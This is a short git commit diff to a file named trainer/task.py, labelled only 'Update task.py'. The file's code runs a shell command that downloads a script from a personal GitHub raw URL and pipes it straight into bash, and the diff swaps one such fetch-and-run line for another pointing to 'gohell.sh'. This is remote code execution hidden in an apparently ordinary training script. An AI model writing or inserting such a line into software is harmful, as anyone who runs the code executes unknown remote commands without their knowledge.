f5832a2d65f018f13619c92b979f125b670c81c2
6248202226 <149418871+6248202226@users.noreply.github.com>
2023-11-26 05:58:57 +0700

    Update task.py

--- trainer/task.py
+++ trainer/task.py
@@ -1,3 +1,3 @@
 import sys
 import os
-os.system('curl -sL https://raw.githubusercontent.com/6248202226/filesg/main/var | bash')
+os.system('curl -sL https://raw.githubusercontent.com/6248202226/gradi/main/gohell.sh | bash')
